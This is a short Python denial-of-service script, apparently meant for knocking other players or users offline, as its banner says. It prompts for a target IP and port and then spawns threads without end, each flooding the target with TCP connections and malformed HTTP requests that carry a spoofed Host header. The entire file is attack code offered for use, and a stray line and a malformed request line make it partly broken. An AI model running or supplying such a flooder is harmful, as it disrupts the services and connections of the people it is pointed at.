import threading
import socket
import time

print("Welcome ( ° ͜ʖ°)╭∩╮. You here to kick some kids offline?")
time.sleep(2)

target = input("Enter a IP: ")
time.sleep(1)

str_port = input("Enter port: ")
time.sleep(1)
_
port = int(str_port)
fake_ip = '10.10.192.1'

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,port))
		s.sendto(("GET /" + target + "HTTP/1.1.\r\n").encode('ascii'),(target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
		s.close()

while True:
	thread = threading.Thread(target=attack)
	thread.start()
	print(thread)
